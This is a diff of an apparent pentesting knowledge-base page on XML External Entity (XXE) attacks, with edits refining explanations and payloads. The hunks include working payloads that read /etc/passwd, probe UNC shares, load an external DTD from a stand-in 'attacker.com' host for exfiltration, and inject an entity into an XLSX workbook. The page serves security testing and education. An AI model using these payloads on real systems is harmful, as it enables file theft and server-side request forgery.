@@ -9,7 +9,7 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,700;1,400&family=Inter:wght@400;500&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
-  <link rel="stylesheet" href="/assets/style.css?v=7057614">
+  <link rel="stylesheet" href="/assets/style.css?v=dc44357">
 </head>
 <body class="page-kb-sheet">
   <nav class="topnav">
@@ -331,7 +331,7 @@
 <p>The first line (<code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;</code>) is the XML declaration. Everything else is structured data using custom tags. Applications use XML to exchange information between systems, store configuration files, define API requests and much more.</p>
 <h2 id="what-is-an-xml-parser">What is an XML Parser</h2>
 <p>An XML parser is a piece of software that reads XML documents and makes their content available to the application. When a web application receives XML data (for example in an API request), it passes that data to the parser. The parser reads the XML document, checks its syntax and converts it into something the application can work with. For instance, when a Java server receives a POST request with <code>Content-Type: application/xml</code>, it typically passes the body to a parser like <code>DocumentBuilderFactory</code> to extract the data.</p>
-<p>The key thing to understand is that the parser does not just read the data — it also <strong>processes instructions</strong> embedded in the XML document. This is where the security problem begins, because some of those instructions can tell the parser to read files from the server or make network requests. These instructions are called <strong>entity declarations</strong>, and will be covered in the following sections.</p>
+<p>The key thing to understand is that the parser does not just read the data — it also <strong>evaluates declarations</strong> embedded in the XML document. This is where the security problem begins, because some of those instructions can tell the parser to read files from the server or make network requests. These instructions are called <strong>entity declarations</strong>, and will be covered in the following sections.</p>
 <h2 id="what-is-a-dtd">What is a DTD</h2>
 <p>A DTD (Document Type Definition) is a set of rules that defines the structure of an XML document. DTDs are declared at the beginning of an XML document using the <code>&lt;!DOCTYPE&gt;</code> declaration. Inside the DTD you can define elements, attributes and <strong>entities</strong>.</p>
 <pre class="highlight"><code class="language-xml">&lt;?xml version="1.0"?&gt;
@@ -379,7 +379,7 @@
 <ol>
 <li>Reads the DOCTYPE and registers the entity <code>xxe</code> with its SYSTEM identifier</li>
 <li>When it encounters <code>&amp;xxe;</code> in the document body, looks up the entity</li>
-<li>Sees the <code>SYSTEM</code> keyword and attempts to fetch <code>file:///etc/passwd</code></li>
+<li>If entity resolution is enabled, it sees the <code>SYSTEM</code> keyword and attempts to fetch <code>file:///etc/passwd</code></li>
 <li>Reads the file content and substitutes it in place of <code>&amp;xxe;</code></li>
 <li>Continues parsing the document with the substituted content</li>
 </ol>
@@ -407,7 +407,7 @@
  &lt;/userInfo&gt;</code></pre>
 <p>Here the attacker is defining "example" and assigning the content of "/etc/passwd" as the value. In an ideal situation the content of the file will be printed in the response. If the application does not return the content directly, other exfiltration techniques covered later in this KB can be used.</p>
 <h2 id="requirements">Requirements</h2>
-<p>XXE attacks require the application to accept XML from uncontrolled sources and parse it in an insecure way. Historically, many XML parsers are insecure by default and require the developer to explicitly limit their capabilities by setting specific flags in the component that uses it in order to make them secure. </p>
+<p>XXE attacks require the application to accept XML from uncontrolled sources and parse it in an insecure way. Historically, many XML parsers were insecure by default and require the developer to explicitly limit their capabilities by setting specific flags on the parser in order to make it secure. </p>
 <hr />
 <h1 id="xxe-taxonomy">XXE Taxonomy</h1>
 <p>The following taxonomy classifies all XXE attack techniques covered in this KB. It serves both as a mental model for understanding how XXE exploitation works and as a navigational index. Techniques are grouped by their primary objective and sorted by difficulty/rarity within each category.</p>
@@ -834,7 +834,7 @@ graph LR
 <p>If the target matches any of these patterns and especially if it runs Java, it is worth spending time on XXE testing.</p>
 <p><strong>Tip:</strong> If the API only accepts JSON, do not give up immediately. Try sending an XML payload with <code>Content-Type: application/json</code> — some frameworks parse the body based on content rather than the declared content-type. This technique is covered in <a href="#content-type-switching">Content-Type Switching</a>.</p>
 <h2 id="testing-on-rest-apis">Testing on REST APIs</h2>
-<p>The most reliable way to confirm XXE is by triggering entity resolution. To minimize the risk of information leaks and damage to the server we can try to either reflect a string from an external entity or read a harmless file like the hosts file.</p>
+<p>The most reliable way to confirm XXE is by triggering entity resolution. To minimize the risk of information leaks and damage to the server we can start by reflecting a string from an internal entity to confirm entity processing, then escalate to reading a harmless file.</p>
 <p>Some scenarios would require further testing since the entry point of the attack would not properly reflect our payload in the response. In these cases we can rely on errors coming from the application to identify the exploitability.</p>
 <h3 id="test-1-simple-entity-reflection">Test 1: Simple Entity Reflection</h3>
 <pre class="highlight"><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
@@ -867,7 +867,7 @@ graph LR
     &lt;city&gt;Paris&lt;/city&gt;
   &lt;/contact&gt;
 &lt;/contacts&gt;</code></pre>
-<p>In a real exploitation use case, this payload triggered an "Unknown protocol: sdjsd". This is proof enough to infer that the defined external entity "xxe" is being processed by the XML parser.</p>
+<p>In a real exploitation use case, this payload triggered an "Unknown protocol: sdjsd". This confirms that the parser is attempting to resolve the SYSTEM identifier in the entity declaration.</p>
 <h3 id="test-4-malformed-url-error">Test 4: Malformed URL Error</h3>
 <p>Additionally, we can also trigger errors by malforming the resource declaration as follows:</p>
 <pre class="highlight"><code class="language-XML">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
@@ -1016,7 +1016,7 @@ graph LR
 &lt;!-- UNC path enumeration --&gt;
 &lt;!ENTITY xxe SYSTEM "file:///\\192.168.1.100\c$\Windows\System32\drivers\etc\hosts"&gt;
 &lt;!ENTITY xxe SYSTEM "file:///\\dc.example.com\SYSVOL\example.com\Policies\"&gt;</code></pre>
-<p>Some notes on Windows paths: use forward slashes even on Windows (<code>file:///C:/path/to/file</code>) since backslashes are interpreted as escape characters in XML. UNC paths use <code>file:///\\server\share\file</code>. Some parsers also support alternate data streams: <code>file:///C:/path/file.txt:zone.identifier</code>.</p>
+<p>Some notes on Windows paths: use forward slashes even on Windows (<code>file:///C:/path/to/file</code>) since backslashes are not valid characters in URIs (RFC 3986) and some parsers handle them inconsistently. UNC paths use <code>file:///\\server\share\file</code>. Some parsers also support alternate data streams: <code>file:///C:/path/file.txt:zone.identifier</code>. This works because the parser passes the path to the operating system, which resolves the ADS syntax natively on NTFS filesystems.</p>
 <h5 id="note-on-unc-path-syntax">Note on UNC path syntax</h5>
 <p>The forward slash rule applies to local Windows file paths (<code>file:///C:/path/to/file</code>). UNC paths are an exception — they require the double backslash notation (<code>\\server\share\file</code>) because that is how the UNC convention is defined. Some parsers also accept forward slash equivalents (<code>file:////server/share/file</code>), but backslash notation is more broadly supported for UNC across Java-based parsers.</p>
 <h2 id="server-side-request-forgery-ssrf">Server Side Request Forgery (SSRF)</h2>
@@ -1084,7 +1084,8 @@ graph LR
 <p>Ensure the server is publicly accessible or reachable from the target environment. If DNS resolution might fail, use an IP address instead of a domain name.</p>
 <h3 id="step-3-xml-payload-to-send-to-the-affected-application">Step 3: XML Payload to Send to the Affected Application</h3>
 <p>Send an XML payload that loads the external DTD:</p>
-<pre class="highlight"><code class="language-xml">&lt;!DOCTYPE message [
+<pre class="highlight"><code class="language-xml">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE message [
   &lt;!ENTITY % remote SYSTEM "http://attacker.com/malicious.dtd"&gt;
   %remote;
 ]&gt;
@@ -1171,15 +1172,13 @@ graph LR
 <pre class="highlight"><code class="language-bash">unzip document.xlsx -d xlsx_extracted/</code></pre>
 <p><strong>Step 2:</strong> Inject into the XML files inside the archive. The most reliable injection point is <code>xl/workbook.xml</code> — this is the first file most parsers read to get the list of sheets, making it the most consistently triggered target. Other viable injection points are <code>xl/sharedStrings.xml</code> (shared string table used for cell values) and <code>xl/worksheets/sheet1.xml</code> (individual worksheet data). Here is an example injecting into <code>xl/workbook.xml</code>:</p>
 <pre class="highlight"><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;
-&lt;!DOCTYPE cdl [
-  &lt;!ELEMENT cdl ANY&gt;
+&lt;!DOCTYPE workbook [
   &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
 ]&gt;
-&lt;cdl&gt;&amp;xxe;&lt;/cdl&gt;
 &lt;workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
           xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"&gt;
   &lt;sheets&gt;
-    &lt;sheet name="Sheet1" sheetId="1" r:id="rId1"/&gt;
+    &lt;sheet name="&amp;xxe;" sheetId="1" r:id="rId1"/&gt;
   &lt;/sheets&gt;
 &lt;/workbook&gt;</code></pre>
 <p><strong>Step 3:</strong> Repackage. Use <code>zip -u</code> to update the existing archive in place rather than creating a new one — some Excel parsing libraries check the ZIP signature and will reject a file that was fully recreated:</p>
@@ -1206,7 +1205,7 @@ cd ..</code></pre>
 <h3 id="general-strategy">General strategy</h3>
 <p>The approach is the same for all XML-based formats (SVG, XLSX, DOCX, ODS, ODP, XML, XHTML): include a basic entity, upload, check output. If output is not reflected use blind XXE. Some servers validate MIME types so you may need to craft polyglot files.</p>
 <h2 id="xxe-in-soap">XXE in SOAP</h2>
-<p>SOAP is built on XML and remains widely used in enterprise systems (financial, government). Since SOAP inherently consumes XML, it is a natural target for XXE.</p>
+<p>SOAP is built on XML and remains widely used in enterprise systems (financial, government). Since SOAP inherently consumes XML, it is a natural target for XXE. Note that many SOAP frameworks parse XML at the framework level, so XXE exploitability depends on the framework's parser configuration, not just the application code.</p>
 <p>A typical SOAP request:</p>
 <pre class="highlight"><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
 &lt;soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;
@@ -1367,7 +1366,7 @@ Content-Type: application/json
   %all;
 ]&gt;
 &lt;foo&gt;&amp;content;&lt;/foo&gt;</code></pre>
-<p>When the parser loads the external DTD, <code>%all</code> defines the general entity <code>&amp;content;</code> whose value is <code>&lt;![CDATA[&lt;file contents&gt;]]&gt;</code>. The CDATA wrapper neutralises the special characters before the parser sees them in the document body. This technique requires the parser to be able to reach your server — the same network condition as OOB exfiltration.</p>
+<p>When the parser loads the external DTD, <code>%all</code> defines the general entity <code>&amp;content;</code> whose value is <code>&lt;![CDATA[&lt;file contents&gt;]]&gt;</code>. The CDATA wrapper prevents the parser from interpreting them as markup. This technique requires the parser to be able to reach your server — the same network condition as OOB exfiltration.</p>
 <hr />
 <h1 id="advanced-techniques">Advanced Techniques</h1>
 <p>These techniques require specific technology stacks, rare configurations or complex payload crafting. They are not the first thing to try but can be critical when standard techniques fail. This section also includes environment-specific escalation paths (like RCE through PHP expect:// or Java deserialization) which depend on very particular conditions in the target.</p>
@@ -1394,7 +1393,7 @@ Content-Type: application/json
 <h4 id="identifying-candidates-with-grep">Identifying Candidates with grep</h4>
 <p>To find candidates quickly, run these two commands and cross-reference the output:</p>
 <pre class="highlight"><code class="language-bash">grep -n 'ENTITY %' target.dtd     # list all parameter entity definitions
-grep -n '%[a-zA-Z]' target.dtd    # list all parameter entity references</code></pre>
+grep -n '%[a-zA-Z][a-zA-Z0-9.]*;' target.dtd    # list all parameter entity references</code></pre>
 <p>For each entity that appears in both outputs, check the context of its reference:</p>
 <ul>
 <li>If it appears inside a markup declaration like <code>&lt;!ELEMENT foo (%expr;)*&gt;</code> → <strong>declaration-embedded injection point</strong></li>
@@ -1967,6 +1966,6 @@ ruby server.rb</code></pre>
       });
     });
   </script>
-  <script src="/assets/main.js?v=7057614" defer></script>
+  <script src="/assets/main.js?v=dc44357" defer></script>
 </body>
 </html>
